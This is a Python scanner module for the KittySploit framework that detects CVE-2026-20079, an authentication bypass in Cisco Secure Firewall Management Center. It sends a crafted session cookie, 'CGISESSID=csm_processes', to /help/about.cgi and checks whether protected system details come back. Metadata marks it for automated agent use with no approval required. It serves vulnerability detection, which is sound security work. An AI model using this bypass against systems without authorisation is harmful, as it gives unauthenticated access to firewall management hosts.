#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cisco Secure Firewall Management Center Software contains an authentication bypass caused by improper system p."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cisco Secure Firewall Management Center - Authentication Bypass Detection',
        'description': 'Cisco Secure Firewall Management Center Software contains an authentication bypass caused by improper system process creation at boot, letting unauthenticated remote attackers execute scripts and gain root access, exploit requires crafted HTTP requests.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'cisco', 'fmc', 'auth-bypass', 'rce', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.vulncheck.com/blog/cisco-fmc-auth-bypass-cve-2026-20079',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-20079',
        ],
        'cve': 'CVE-2026-20079',
    }

    def run(self):
        path = '/help/about.cgi'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 302:
            return False
        body = r.text or ""
        body_any = ('Invalid session ID',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/help/about.cgi'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'CGISESSID=csm_processes'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Cisco Secure Firewall Management Center', 'Model', 'OS', 'Hostname',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Cisco Secure Firewall Management Center - Authentication Bypass detected', path=path)
            return True
        return False

